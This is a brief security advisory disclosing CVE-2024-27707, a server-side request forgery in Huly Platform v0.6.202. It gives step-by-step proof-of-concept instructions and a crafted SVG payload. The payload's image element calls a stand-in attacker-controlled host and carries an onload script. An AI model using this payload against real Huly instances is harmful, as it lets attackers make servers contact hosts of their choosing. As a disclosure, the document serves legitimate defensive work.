# CVE-2024-27707: SSRF via file upload in Huly Platform

A SSRF vulnerability exists in Huly Platform v.0.6.202. When attaching files to issues it's possible to upload SVG files, with a crafted svg it's possible to trigger the SSRF when opened.

PoC:

1. Open the people's tab and choose a random person to open
2. Go to the files tab
3. Upload the following SVG

```
<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo" o="foo"/>
  <image xlink:href="https://link_to_server.com" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
</svg>
```

4. Open the file in a new tab and the application server will make http requests to the server the attacker controls.

Discovered by Bruno Menna, February 2024.

References:

- https://nvd.nist.gov/vuln/detail/CVE-2024-27707
- https://www.cve.org/CVERecord?id=CVE-2024-27707
